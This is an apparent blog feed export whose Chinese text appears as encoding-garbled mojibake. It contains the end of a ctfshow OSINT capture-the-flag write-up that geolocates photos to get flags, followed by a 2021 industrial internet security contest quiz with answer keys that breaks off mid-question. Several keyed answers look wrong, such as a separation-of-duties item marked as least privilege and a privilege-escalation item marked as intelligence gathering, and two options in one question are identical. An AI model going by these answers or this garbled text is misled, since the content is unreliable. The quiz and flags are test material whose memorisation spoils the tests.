title="ç°æ‹‰ç°åƒ"></a>ç°æ‹‰ç°åƒ</h2><blockquote><p>æäº¤å›¾ä¸­åº—é“ºå…¨åçš„æ‹¼éŸ³ï¼ˆæ— åˆ†éš”ç¬¦å’Œå£°è°ƒã€å­—æ¯å…¨å°å†™ï¼‰åŠ é£Ÿç‰©ä»·æ ¼ï¼ˆé˜¿æ‹‰ä¼¯æ•°å­—ï¼‰å³å¯ï¼Œ ä¾‹å¦‚ï¼šctfshow{zhouzilamian114514}ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-5.png"></p></blockquote><p>ç™¾åº¦è¯†å›¾å‘ç°ç›¸ä¼¼å›¾ç‰‡ï¼Œè¿›è€Œå¾—çŸ¥è¿™å®¶åº—æ˜¯äº‘å³°æ¸…çœŸé¤å…(å—æ»¨æ²³è·¯åº—)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-007.png"></p><p>ç„¶åæœç´¢è¯¥åº—ç‰›è‚‰é¢ä»·æ ¼å¾—çŸ¥ä¸€ç¢—ç‰›è‚‰é¢10å—é’±ï¼Œæœ€ç»ˆå¾—åˆ°flagï¼šctfshow{yunfengqingzhencantingnanbinheludian10}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-008.png"></p><p>æäº¤ä¸å¯¹ï¼Œå›å¤´ä»”ç»†å†çœ‹ä¸€ä¸‹å‘ç°åº—åæ˜¯äº‘å³°ç‰›è‚‰é¢ï¼Œå¾—åˆ°flagï¼šctfshow{yunfengniuroumian10}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-009.png"></p><p>wocè¿˜æ˜¯ä¸å¯¹ï¼Œå†æŸ¥ä¸€ä¸‹å‘ç°ä»–åº”è¯¥æ˜¯åŠ ä¸ªä»½ç‰›è‚‰ï¼Œæœ€åçš„ä»·æ ¼åº”è¯¥æ˜¯10+7=17ï¼Œå¾—åˆ°flagï¼šctfshow{yunfengniuroumian17}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-010.png"></p><h2 id="åˆçª¥é—¨å¾„"><a href="#åˆçª¥é—¨å¾„" class="headerlink" title="åˆçª¥é—¨å¾„"></a>åˆçª¥é—¨å¾„</h2><blockquote><p>æ‹æ‘„è€…åé¢çš„å»ºç­‘åç§°ï¼Œæ ¼å¼ctfshow{å»ºç­‘åç§°ä¸­æ–‡}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-6.jpg"></p></blockquote><p>é€šè¿‡yandexè¯†å›¾å¹¶è¿›è¡Œå±€éƒ¨ç‰¹å¾è¯†åˆ«é”å®šæ­¤ä¸ºå¼€ç½— - åƒå¡”ä¹‹åŸï¼Œè¿›è€Œå¾—åˆ°flagï¼šctfshow{èƒ¡å¤«é‡‘å­—å¡”}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-011.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¹´ä¸­å›½å·¥ä¸šäº’è”ç½‘å®‰å…¨å¤§èµ›(ç¦å»ºçœé€‰æ‹”èµ›) æš¨é¦–å±Šç¦å»ºçœå·¥ä¸šäº’è”ç½‘åˆ›æ–°å¤§èµ›</title>
      <link href="2021/09/09/2021gongkong/"/>
      <url>2021/09/09/2021gongkong/</url>
      
        <content type="html"><![CDATA[<h1 id="ç†è®º"><a href="#ç†è®º" class="headerlink" title="ç†è®º"></a><strong>ç†è®º</strong></h1><h2 id="å•é€‰é¢˜"><a href="#å•é€‰é¢˜" class="headerlink" title="å•é€‰é¢˜"></a><strong>å•é€‰é¢˜</strong></h2><p>ipåœ°å€åˆ†ä¸ºå…¨çƒåœ°å€ï¼ˆå…¬æœ‰åœ°å€ï¼‰å’Œä¸“ç”¨åœ°å€ï¼ˆç§æœ‰åœ°å€ï¼‰ï¼Œåœ¨æ–‡æ¡£rfc1918ä¸­ï¼Œä¸å±äºä¸“ç”¨åœ°å€çš„æ˜¯ ï¼ˆD ï¼‰ã€‚</p><p>A 172. 16. 0. 0 åˆ° 172. 31. 255. 255</p><p>B 10. 0. 0. 0 åˆ° 10. 255. 255. 255</p><p>C 192. 168. 0. 0 åˆ° 192. 168. 255. 255</p><p>D 255. 0. 0. 0 åˆ° 255. 255. 255. 255</p><p>åœ¨éå¯¹ç§°åŠ å¯†ç®—æ³•ä¸­ï¼Œæ¶‰åŠåˆ°çš„å¯†é’¥ä¸ªæ•°æ˜¯ï¼Ÿï¼ˆDï¼‰</p><p>A ä¸‰ä¸ªä»¥ä¸Š</p><p>B ä¸€ä¸ª</p><p>C ä¸‰ä¸ª</p><p>D ä¸¤ä¸ª</p><p>ç›¸é‚»çš„è·¯ç”±å™¨åœ¨æ»¡è¶³ä¸€å®šæ¡ä»¶æ—¶æ‰èƒ½æˆä¸ºé‚»å±…ï¼Œä»¥ä¸‹ä¸å±äºå¿…è¦æ¡ä»¶çš„æ˜¯ï¼ˆBï¼‰ã€‚</p><p>A ä½äºç›¸åŒç½‘æ®µ</p><p>B ç›¸åŒå‹å·</p><p>C ç›¸åŒ Hello é—´éš”</p><p>D ä½äºç›¸åŒåŒºåŸŸ</p><p>æ•°æ®å¤‡ä»½é€šå¸¸å¯åˆ†ä¸ºå®Œå…¨å¤‡ä»½ã€å¢é‡å¤‡ä»½ã€å·®åˆ†å¤‡ä»½å’Œæ¸è¿›å¼å¤‡ä»½å‡ ç§æ–¹å¼ã€‚å…¶ä¸­å°†ç³»ç»Ÿä¸­æ‰€æœ‰é€‰æ‹©çš„æ•°æ®å¯¹è±¡è¿›è¡Œä¸€æ¬¡å…¨é¢çš„å¤‡ä»½ï¼Œè€Œä¸ç®¡æ•°æ®å¯¹è±¡è‡ªä¸Šæ¬¡å¤‡ä»½ä¹‹åæ˜¯å¦ä¿®æ”¹è¿‡çš„å¤‡ä»½æ–¹å¼æ˜¯ï¼ˆ A ï¼‰ã€‚</p><p>A å®Œå…¨å¤‡ä»½</p><p>B å·®åˆ†å¤‡ä»½</p><p>C æ¸è¿›å¼å¤‡ä»½</p><p>D å¢é‡å¤‡ä»½</p><p>ä½ æœ‰ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œä½ å°†å®ƒçš„NTFSæƒé™è®¾ç½®ä¸ºsamç”¨æˆ·å¯ä»¥ä¿®æ”¹ï¼Œå…±äº«æƒé™è®¾ç½®ä¸ºsamç”¨æˆ·å¯ä»¥è¯»å–ï¼Œå½“samä»ç½‘ç»œè®¿é—®è¿™ä¸ªå…±äº«æ–‡ä»¶å¤¹çš„æ—¶å€™ï¼Œä»–æœ‰ä»€ä¹ˆæ ·çš„æƒé™ï¼Ÿï¼ˆBï¼‰</p><p>A å†™å…¥</p><p>B è¯»å–</p><p>C ä¿®æ”¹</p><p>D å®Œå…¨æ§åˆ¶</p><p>VTP ä¿®å‰ªçš„å‘½ä»¤æ˜¯ï¼ˆCï¼‰ã€‚</p><p>A vtp brief</p><p>B vtp domain</p><p>C vtp pruning</p><p>D vtp status</p><p>åœ¨ P2DR2 å®‰å…¨æ¨¡å‹ä¸­ï¼Œâ€œRtâ€ä»£è¡¨ï¼ˆAï¼‰ã€‚</p><p>A ç³»ç»Ÿåšå‡ºå“åº”æ‰€éœ€æ—¶é—´</p><p>B ç³»ç»Ÿæ£€æµ‹åˆ°æ”»å‡»è¡Œä¸ºæ‰€éœ€æ—¶é—´</p><p>C å®‰å…¨ä½“ç³»å»ºè®¾æ‰€éœ€æ—¶é—´</p><p>D æ”»å‡»æˆåŠŸæ‰€éœ€æ—¶é—´</p><p>ä¸‹åˆ—æœ‰å…³å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç­–ç•¥ä¸è¿‡ç¨‹çš„è„†å¼±æ€§æè¿°æœ‰è¯¯çš„ä¸€é¡¹æ˜¯ï¼šï¼ˆAï¼‰</p><p>A å‘ç”Ÿç¡¬ä»¶æˆ–è½¯ä»¶é”™è¯¯ä»¥åŠè®¾å¤‡æŸæ¯æ—¶ï¼ŒåŠŸèƒ½å®‰å…¨äº§å“èµ·åˆ°å¿…è¦çš„é˜²æŠ¤ä½œç”¨ï¼Œä¸éœ€è¦åˆ¶å®šç¾éš¾æ¢å¤æœºåˆ¶æ¥åº”å¯¹ï¼›</p><p>B ä¸é€‚å½“çš„é…ç½®æˆ–ç¼ºå°‘ç‰¹åˆ«é€‚ç”¨äºæ§åˆ¶ç³»ç»Ÿä¿¡æ¯å®‰å…¨çš„ç­–ç•¥é€šå¸¸å¯¼è‡´å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„å—åˆ°é»‘å®¢æ”»å‡»ï¼›</p><p>C å¿…é¡»ä¸ºå·¥ä¸šæ§åˆ¶ç³»ç»Ÿå¼€å‘ä¸“ç”¨çš„ã€æ€»ä½“æ€§çš„ä¿¡æ¯å®‰å…¨æµç¨‹ï¼Œè¯¥æµç¨‹æ˜¯å…¶ä»–æ‰€æœ‰ä¿¡æ¯å®‰å…¨æªæ–½çš„åŸºç¡€ï¼›</p><p>D æ§åˆ¶ç³»ç»Ÿå·¥ç¨‹å¸ˆä¸€èˆ¬ç¼ºä¹ä¿¡æ¯å®‰å…¨æ–¹é¢çš„ä¸“ä¸šåŸ¹è®­ï¼Œä¸å¯èƒ½ç»´æŠ¤å®‰å…¨å¯é çš„å·¥ä¸šæ§åˆ¶ç³»ç»Ÿï¼›</p><p>èº«ä»½è®¤è¯æ˜¯è¯å®å®¢æˆ·çš„çœŸå®èº«ä»½ä¸å…¶æ‰€å£°ç§°çš„èº«ä»½æ˜¯å¦ç›¸ç¬¦çš„éªŒè¯è¿‡ç¨‹ã€‚ç›®å‰ï¼Œè®¡ç®—æœºåŠç½‘ç»œç³»ç»Ÿä¸­å¸¸ç”¨çš„èº«ä»½è®¤è¯æŠ€æœ¯ä¸»è¦æœ‰ï¼šç”¨æˆ·å/å¯†ç æ–¹å¼ã€æ™ºèƒ½å¡è®¤è¯ã€åŠ¨æ€å£ä»¤ã€ç”Ÿç‰©ç‰¹å¾è®¤è¯ç­‰ã€‚å…¶ä¸­èƒ½ç”¨äºèº«ä»½è®¤è¯çš„ç”Ÿç‰©ç‰¹å¾å¿…é¡»å…·æœ‰ï¼ˆC ï¼‰ã€‚</p><p>A ç¨³å®šæ€§å’Œå®Œæ•´æ€§</p><p>B ä¿å¯†æ€§å’Œå®Œæ•´æ€§</p><p>C å”¯ä¸€æ€§å’Œç¨³å®šæ€§</p><p>D å”¯ä¸€æ€§å’Œä¿å¯†æ€§</p><p>è®¾ç½®äº†äº¤æ¢æœºç«¯å£å®‰å…¨æ—¶ï¼Œè¿åè§„åˆ™åçš„å¤„ç†ç­–ç•¥ä¸åŒ…æ‹¬ä»¥ä¸‹å“ªä¸€æ¡ï¼ˆBï¼‰ã€‚</p><p>A shutdown</p><p>B restart</p><p>C protect</p><p>D restrict</p><p>å…¥ä¾µæ£€æµ‹å¯¹ç½‘ç»œã€ç³»ç»Ÿè¿è¡ŒçŠ¶æ€è¿›è¡Œç›‘è§†ï¼Œåœ¨å‘ç°å…¥ä¾µååŠæ—¶ä½œå‡ºç›¸åº”ï¼Œä¸åŒ…æ‹¬ä¸‹åˆ—å“ªä¸ªï¼ˆAï¼‰ã€‚</p><p>A å¤åŸå˜æ›´æ–‡ä»¶</p><p>B æŠ¥è­¦</p><p>C åˆ‡æ–­ç½‘ç»œè¿æ¥</p><p>D è®°å½•äº‹ä»¶</p><p>MD5 å¯†æ–‡è®¤è¯çš„æ—¶å€™ï¼Œå¯†ç æœ€å¤šæ”¯æŒä¸ºï¼ˆDï¼‰ä¸ªå­—ç¬¦ã€‚</p><p>A 64</p><p>B 8</p><p>C 32</p><p>D 16</p><p>ç”µå­é‚®ä»¶ç³»ç»Ÿçš„é‚®ä»¶åè®®æœ‰å‘é€åè®®smtpå’Œæ¥æ”¶åè®®p0p3/imap4ã€‚smtpå‘é€åè®®ä¸­ï¼Œå‘é€èº«ä»½æ ‡è¯†çš„æŒ‡ä»¤æ˜¯ï¼ˆA ï¼‰ã€‚</p><p>A helo</p><p>B help</p><p>C send</p><p>D saml</p><p>å‡è®¾ä½¿ç”¨ä¸€ç§åŠ å¯†ç®—æ³•ï¼Œå®ƒçš„åŠ å¯†æ–¹æ³•å¾ˆç®€å•ï¼šå°†æ¯ä¸€ä¸ªå­—æ¯åŠ  5ï¼Œå³ aåŠ å¯†æˆ fã€‚è¿™ç§ç®—æ³•çš„å¯†é’¥å°±æ˜¯ 5ï¼Œé‚£ä¹ˆå®ƒå±äºï¼ˆB ï¼‰</p><p>A å•é¡¹å‡½æ•°å¯†ç æŠ€æœ¯</p><p>B å¯¹ç§°åŠ å¯†æŠ€æœ¯</p><p>C åˆ†ç»„åŠ å¯†æŠ€æœ¯</p><p>D å…¬é’¥åŠ å¯†æŠ€æœ¯</p><p>ä¸‹åˆ—å…³äºå·¥ä¸šSCADAç³»ç»Ÿä¿¡æ¯å®‰å…¨åŸºç¡€æŠ€æœ¯é”™è¯¯çš„æ˜¯ï¼šï¼ˆDï¼‰ã€‚</p><p>A é˜²ç«å¢™ä½¿ç”¨å’ŒäºŒæ¬¡ç¼–ç¨‹å¼€å‘éƒ½ä¸å¤ªæ–¹ä¾¿</p><p>B å®¡è®¡æ—¥å¿—ä½¿ç”¨æ–¹ä¾¿ï¼Œä½†ä¸æ”¯æŒäºŒæ¬¡ç¼–ç¨‹å¼€å‘</p><p>C ç”Ÿç‰©ç‰¹å¾å› å­ä½¿ç”¨æ–¹ä¾¿ï¼Œä½†ä¸æ”¯æŒäºŒæ¬¡ç¼–ç¨‹å¼€å‘</p><p>D å…¥ä¾µæ£€æµ‹ç³»ç»Ÿä½¿ç”¨å’ŒäºŒæ¬¡ç¼–ç¨‹å¼€å‘éƒ½å¾ˆæ–¹ä¾¿</p><p>å«æœ‰ä¸¤ä¸ªå¯†é’¥çš„3é‡desåŠ å¯†ï¼š ,å…¶ä¸­k1â‰ k2ï¼Œåˆ™å…¶æœ‰æ•ˆçš„å¯†é’¥é•¿åº¦ä¸ºï¼ˆ Bï¼‰ã€‚</p><p>A 56 ä½</p><p>B 112 ä½</p><p>C 168 ä½</p><p>D 128 ä½</p><p>æ— çº¿å±€åŸŸç½‘é‰´åˆ«å’Œä¿å¯†ä½“ç³»wapiæ˜¯ä¸€ç§å®‰å…¨åè®®ï¼Œä¹Ÿæ˜¯æˆ‘å›½æ— çº¿å±€åŸŸç½‘å®‰å…¨å¼ºåˆ¶æ€§æ ‡å‡†ï¼Œä»¥ä¸‹å…³äºwapiçš„æè¿°ä¸­ï¼Œæ­£ç¡®çš„æ˜¯ï¼ˆD ï¼‰ã€‚</p><p>A wapiä»åº”ç”¨æ¨¡å¼ä¸Šåˆ†ä¸ºå•ç‚¹å¼ã€åˆ†å¸ƒå¼å’Œé›†ä¸­å¼</p><p>B wapiä¸­ï¼Œwpié‡‡ç”¨rsaç®—æ³•è¿›è¡ŒåŠ è§£å¯†æ“ä½œ</p><p>C wapiä¸wifiè®¤è¯æ–¹å¼ç±»ä¼¼ï¼Œå‡é‡‡ç”¨å•å‘åŠ å¯†çš„è®¤è¯æŠ€æœ¯</p><p>D wapiç³»ç»Ÿä¸­ï¼Œé‰´æƒæœåŠ¡å™¨asè´Ÿè´£è¯ä¹¦çš„é¢å‘ã€éªŒè¯å’Œæ’¤é”€</p><p>äººä¸ºçš„å®‰å…¨å¨èƒåŒ…æ‹¬ä¸»åŠ¨æ”»å‡»å’Œè¢«åŠ¨æ”»å‡»ã€‚ä¸»åŠ¨æ”»å‡»æ˜¯æ”»å‡»è€…ä¸»åŠ¨å¯¹ä¿¡æ¯ç³»ç»Ÿå®æ–½æ”»å‡»ï¼Œå¯¼è‡´ä¿¡æ¯æˆ–ç³»ç»ŸåŠŸèƒ½æ”¹å˜ã€‚è¢«åŠ¨æ”»å‡»ä¸ä¼šå¯¼è‡´ç³»ç»Ÿä¿¡æ¯çš„ç¯¡æ”¹ï¼Œç³»ç»Ÿæ“ä½œä¸çŠ¶æ€ä¸ä¼šæ”¹å˜ã€‚ä»¥ä¸‹å±äºè¢«åŠ¨æ”»å‡»çš„æ˜¯ ï¼ˆB ï¼‰ã€‚</p><p>A ä¼ªè£…</p><p>B å—…æ¢</p><p>C é‡æ”¾æ”»å‡»</p><p>D è¶Šæƒè®¿é—®</p><p>åœ¨å…¥ä¾µæ£€æµ‹çš„åŸºç¡€ä¸Šï¼Œé”å®šæ¶‰å«Œéæ³•ä½¿ç”¨çš„ç”¨æˆ·ï¼Œå¹¶é™åˆ¶å’Œç¦æ­¢è¯¥ç”¨æˆ·çš„ä½¿ç”¨ã€‚è¿™ç§è®¿é—®å®‰å…¨æ§åˆ¶æ˜¯ï¼Ÿï¼ˆBï¼‰</p><p>A æƒé™æ§åˆ¶</p><p>B ç½‘ç»œæ£€æµ‹æ§åˆ¶</p><p>C é˜²ç«å¢™æ§åˆ¶</p><p>D å…¥ç½‘è®¿é—®æ§åˆ¶</p><p>ç§»ä½å¯†ç çš„åŠ å¯†å¯¹è±¡ä¸ºè‹±æ–‡å­—æ¯ï¼Œç§»ä½å¯†ç é‡‡ç”¨å¯¹æ˜æ–‡æ¶ˆæ¯çš„æ¯ä¸€ä¸ªè‹±æ–‡å­—æ¯å‘å‰æ¨ç§»å›ºå®šåŒ–yä½çš„æ–¹å¼å®ç°åŠ å¯†ã€‚è®¾key=3ï¼Œåˆ™å¯¹åº”æ˜æ–‡mathçš„å¯†æ–‡ä¸º(D )ã€‚</p><p>A qexl</p><p>B rfym</p><p>C ocvj</p><p>D pdwk</p><p>ä¸ºäº†è¾¾åˆ°ä¿¡æ¯å®‰å…¨çš„ç›®æ ‡ï¼Œå„ç§ä¿¡æ¯å®‰å…¨æŠ€æœ¯çš„ä½¿ç”¨å¿…é¡»éµå®ˆä¸€äº›åŸºæœ¬åŸåˆ™ï¼Œå…¶ä¸­åœ¨ä¿¡æ¯ç³»ç»Ÿä¸­ï¼Œåº”è¯¥å¯¹æ‰€æœ‰æƒé™è¿›è¡Œé€‚å½“åœ°åˆ’åˆ†ï¼Œä½¿æ¯ä¸ªæˆæƒä¸»ä½“åªèƒ½æ‹¥æœ‰å…¶ä¸­çš„ä¸€éƒ¨åˆ†æƒé™ï¼Œä½¿å®ƒä»¬ä¹‹é—´ç›¸äº’åˆ¶çº¦ã€ç›¸äº’ç›‘ç£ï¼Œå…±åŒä¿è¯ä¿¡æ¯ç³»ç»Ÿå®‰å…¨çš„æ˜¯ ï¼ˆB ï¼‰ã€‚</p><p>A çºµæ·±é˜²å¾¡åŸåˆ™</p><p>B æœ€å°åŒ–åŸåˆ™</p><p>C åˆ†æƒåˆ¶è¡¡åŸåˆ™</p><p>D å®‰å…¨éš”ç¦»åŸåŸåˆ™</p><p>æ— è®ºæ˜¯å“ªä¸€ç§webæœåŠ¡å™¨ï¼Œéƒ½ä¼šå—åˆ°httpåè®®æœ¬èº«å®‰å…¨é—®é¢˜çš„å›°æ‰°ï¼Œè¿™æ ·çš„ä¿¡æ¯ç³»ç»Ÿå®‰å…¨æ¼æ´å±äºï¼ˆC ï¼‰ã€‚</p><p>A å¼€å‘å‹æ¼æ´</p><p>B éªŒè¯å‹æ¼æ´</p><p>C è¿è¡Œå‹æ¼æ´</p><p>D è®¾è®¡å‹æ¼æ´</p><p>ä¸ºäº†é˜²æ­¢ä¸€äº›æ¼æ´ï¼ˆä¾‹å¦‚è·¨ç«™è„šæœ¬ï¼‰ï¼Œéœ€è¦å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒHTMLç¼–ç ï¼Œä¾‹å¦‚ï¼šå¯¹ç‰¹æ®Šå­—ç¬¦&amp;è¿›è¡Œ HTML è½¬ç åä¸ºï¼ˆAï¼‰</p><p>A &amp;</p><p>B &lt;</p><p>C &gt;</p><p>D â€œ</p><p>ç”±äºæ”»å‡»è€…å¯ä»¥å€ŸåŠ©æŸç§æ‰‹æ®µï¼Œé¿å¼€ DBMSä»¥åŠåº”ç”¨ç¨‹åºè€Œç›´æ¥è¿›å…¥ç³»ç»Ÿè®¿é—®æ•°æ®ï¼Œæˆ‘ä»¬é€šå¸¸é‡‡å–ä»¥ä¸‹å“ªç§æ–¹å¼æ¥é˜²èŒƒï¼Ÿ( A )</p><p>A æ•°æ®åº“åŠ å¯†</p><p>B ä½¿ç”¨é›†åˆæ³•</p><p>C ä¿®æ”¹æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼Œå°†ä¹‹æ”¹å¾—æ›´ä¸ºå¤æ‚</p><p>D ä½¿ç”¨ä¿®æ”¹æŸ¥è¯¢æ³•ï¼Œä½¿ç”¨æˆ·åœ¨æŸ¥è¯¢æ•°æ®åº“æ—¶éœ€è¦æ»¡è¶³æ›´å¤šçš„æ¡ä»¶</p><p>pkiæ˜¯ä¸€ç§æ ‡å‡†çš„å…¬é’¥å¯†ç å¯†é’¥ç®¡ç†å¹³å°ã€‚åœ¨pkiä¸­ï¼Œè®¤è¯ä¸­å¿ƒcaæ˜¯æ•´ä¸ªpkiä½“ç³»ä¸­å„æ–¹éƒ½æ‰¿è®¤çš„ä¸€ä¸ªå€¼å¾—ä¿¡èµ–çš„ã€å…¬æ­£çš„ç¬¬ä¸‰æ–¹æœºæ„ã€‚caçš„åŠŸèƒ½ä¸åŒ…æ‹¬ï¼ˆD ï¼‰ã€‚</p><p>A è¯ä¹¦çš„å¤‡ä»½</p><p>B è¯ä¹¦çš„å®¡æ‰¹</p><p>C è¯ä¹¦çš„é¢å‘</p><p>D è¯ä¹¦çš„åŠ å¯†</p><p>åœ¨ IPSecä¸­ï¼Œï¼ˆB ï¼‰æ˜¯ä¸¤ä¸ªé€šä¿¡å®ä½“ç»è¿‡åè°ƒå»ºç«‹èµ·æ¥çš„ä¸€ç§åå®šï¼Œè§‰å¾—ç”¨æ¥ä¿æŠ¤æ•°æ®åŒ…å®‰å…¨çš„ IPSecåè®®ã€å¯†ç ç®—æ³•ã€å¯†é’¥ç­‰ä¿¡æ¯ã€‚</p><p>A ESP</p><p>B SA</p><p>C SP</p><p>D SPI</p><p>ä¸‹é¢å“ªç±»è®¿é—®æ§åˆ¶æ¨¡å‹æ˜¯åŸºäºå®‰å…¨æ ‡ç­¾å®ç°çš„ï¼Ÿï¼ˆDï¼‰</p><p>A åŸºäºèº«ä»½çš„è®¿é—®æ§åˆ¶</p><p>B è‡ªä¸»è®¿é—®æ§åˆ¶</p><p>C åŸºäºè§„åˆ™çš„è®¿é—®æ§åˆ¶</p><p>D å¼ºåˆ¶è®¿é—®æ§åˆ¶</p><p>å·²çŸ¥BX=2000Hï¼ŒSI=1234Hï¼Œåˆ™æŒ‡ä»¤MOV AXï¼Œ[BX+SI+2]çš„æºæ“ä½œåœ¨ ï¼ˆ D ï¼‰ä¸­</p><p>A é™„åŠ æ®µä¸­åç§»é‡ä¸º3236Hçš„å­—èŠ‚</p><p>B æ•°æ®æ®µä¸­åç§»é‡ä¸º3234Hçš„å­—èŠ‚</p><p>C é™„åŠ æ®µä¸­åç§»é‡ä¸º3234Hçš„å­—èŠ‚</p><p>D æ•°æ®æ®µä¸­åç§»é‡ä¸º3236Hçš„å­—èŠ‚</p><p>AOå’ŒAIåˆ†åˆ«è¡¨ç¤ºï¼ˆCï¼‰æ­£ç¡®ç­”æ¡ˆ</p><p>A æ¨¡æ‹Ÿé‡è¾“å‡ºå’Œæ•°å­—é‡è¾“å…¥</p><p>B æ•°å­—é‡è¾“å‡ºå’Œæ•°å­—é‡è¾“å…¥</p><p>C æ¨¡æ‹Ÿé‡è¾“å‡ºå’Œæ¨¡æ‹Ÿé‡è¾“å…¥</p><p>D æ¨¡æ‹Ÿé‡è¾“å‡ºå’Œæ•°å­—é‡è¾“å‡º</p><p>Profibusçš„é€šä¿¡å‚è€ƒæ¨¡å‹ä¸­ä¸åŒ…æ‹¬ä¸‹é¢é‚£ä¸€é¡¹ï¼ˆDï¼‰</p><p>A æ•°æ®é“¾è·¯å±‚</p><p>B ç‰©ç†å±‚</p><p>C åº”ç”¨å±‚</p><p>D ç½‘ç»œå±‚</p><p>ä¸‹åˆ—å“ªäº›è¡Œä¸ºä¸èƒ½åŠ å›ºSCADAç³»ç»Ÿï¼šï¼ˆCï¼‰</p><p>A å¸è½½ä¸å¿…è¦çš„è½¯ä»¶</p><p>B æ–­å¼€æœªè®¤è¯çš„è®¿é—®æ¥å£</p><p>C ä¸èƒ½é€šè¿‡ç«¯å£æ‰«æå¯¹ç³»ç»Ÿç¯å¢ƒè¿›è¡Œæµ‹è¯•</p><p>D ç¦æ­¢ä¸ä½¿ç”¨çš„ç«¯å£</p><p>ipsecåè®®å¯ä»¥ä¸ºæ•°æ®ä¼ è¾“æä¾›æ•°æ®æºéªŒè¯ã€æ— è¿æ¥æ•°æ®å®Œæ•´æ€§ã€æ•°æ®æœºå¯†æ€§ã€æŠ—é‡æ’­ç­‰å®‰å…¨æœåŠ¡ã€‚å…¶å®ç°ç”¨æˆ·è®¤è¯é‡‡ç”¨çš„åè®®æ˜¯ï¼ˆ D ï¼‰ã€‚</p><p>A espåè®®</p><p>B skipåè®®</p><p>C ikeåè®®</p><p>D ahåè®®</p><p>snortæ˜¯ä¸€æ¬¾å¼€æºçš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå®ƒèƒ½å¤Ÿæ‰§è¡Œå®æ—¶æµé‡åˆ†æå’Œipåè®®ç½‘ç»œçš„æ•°æ®åŒ…è®°å½•ã€‚ä»¥ä¸‹ä¸å±äºsnorté…ç½®æ¨¡å¼çš„æ˜¯ï¼ˆ B ï¼‰ã€‚</p><p>A åŒ…è®°å½•</p><p>B åˆ†å¸ƒå¼å…¥ä¾µæ£€æµ‹</p><p>C å—…æ¢</p><p>D ç½‘ç»œå…¥ä¾µæ£€æµ‹</p><p>aptæ”»å‡»æ˜¯ä¸€ç§ä»¥å•†ä¸šæˆ–è€…æ”¿æ²»ç›®çš„ä¸ºå‰æçš„ç‰¹å®šæ”»å‡»ï¼Œå…¶ä¸­æ”»å‡»è€…é‡‡ç”¨å£ä»¤çªƒå¬ã€æ¼æ´æ”»å‡»ç­‰æ–¹å¼å°è¯•è¿›ä¸€æ­¥å…¥ä¾µç»„ç»‡å†…éƒ¨çš„ä¸ªäººç”µè„‘å’ŒæœåŠ¡å™¨ï¼Œä¸æ–­æå‡è‡ªå·±çš„æƒé™ï¼Œç›´è‡³è·å¾—æ ¸å¿ƒç”µè„‘å’ŒæœåŠ¡å™¨æ§åˆ¶æƒçš„è¿‡ç¨‹è¢«ç§°ä¸ºï¼ˆ D ï¼‰ã€‚</p><p>A æ¨ªå‘æ¸—é€</p><p>B é˜²çº¿çªç ´</p><p>C é€šé“å»ºç«‹</p><p>D æƒ…æŠ¥æ”¶é›†</p><p>åœ¨ä¿¡æ¯ç³»ç»Ÿä¸Šå·¥ä½œï¼Œä¿è¯å®‰å…¨çš„æŠ€æœ¯æªæ–½åŒ…æ‹¬( B )ã€‚</p><p>A æˆæƒï¼Œå¤‡ä»½ï¼Œæµ‹è¯•</p><p>B æˆæƒï¼Œå¤‡ä»½ï¼ŒéªŒè¯</p><p>C æˆæƒï¼Œè°ƒè¯•ï¼ŒéªŒè¯</p><p>D è°ƒè¯•ï¼Œå¤‡ä»½ï¼ŒéªŒè¯</p><p>åŸºäºmd4å’Œmd5è®¾è®¡çš„s/keyå£ä»¤æ˜¯ä¸€ç§ä¸€æ¬¡æ€§å£ä»¤ç”Ÿæˆæ–¹æ¡ˆï¼Œå®ƒå¯ä»¥å¯¹è®¿é—®è€…çš„èº«ä»½ä¸è®¾å¤‡è¿›è¡Œç»¼åˆéªŒè¯ï¼Œè¯¥æ–¹æ¡ˆå¯ä»¥å¯¹æŠ—ï¼ˆ C ï¼‰ã€‚</p><p>A ç©·ä¸¾æ”»å‡»</p><p>B ç½‘ç»œé’“é±¼</p><p>C é‡æ”¾æ”»å‡»</p><p>D æ•°å­¦åˆ†ææ”»å‡»</p><p>åœ¨ RIPçš„ MD5è®¤è¯æŠ¥æ–‡ä¸­ï¼Œç»è¿‡åŠ å¯†çš„å¯†é’¥æ˜¯æ”¾åœ¨å“ªé‡Œçš„ï¼Ÿï¼ˆ B ï¼‰</p><p>A æŠ¥æ–‡å¤´é‡Œ</p><p>B æŠ¥æ–‡çš„ç¬¬äºŒä¸ªè¡¨é¡¹é‡Œ</p><p>C æŠ¥æ–‡çš„ç¬¬ä¸€ä¸ªè¡¨é¡¹é‡Œ</p><p>D æŠ¥æ–‡çš„ç¬¬äºŒä¸ªè¡¨é¡¹é‡Œ</p><p>å¦‚æœå¯¹ä¸€ä¸ªå¯†ç ä½“åˆ¶çš„ç ´è¯‘ä¾èµ–äºå¯¹æŸä¸€ä¸ªç»è¿‡æ·±å…¥ç ”ç©¶çš„æ•°å­¦éš¾é¢˜çš„è§£å†³ï¼Œå°±è®¤ä¸ºç›¸åº”çš„å¯†ç ä½“åˆ¶æ˜¯ï¼ˆ D ï¼‰çš„ã€‚</p><p>A è®¡ç®—å®‰å…¨</p><p>B ç»å¯¹å®‰å…¨</p><p>C æ— æ¡ä»¶å®‰å…¨</p><p>D å¯è¯æ˜å®‰å…¨</p><p>CDP æ•°æ®åŒ…ç»“æ„ä¸­ä¸»è¦ä¸åŒ…æ‹¬ä»¥ä¸‹å“ªä¸€ä¸ªï¼ˆAï¼‰ã€‚</p><p>A STP</p><p>B 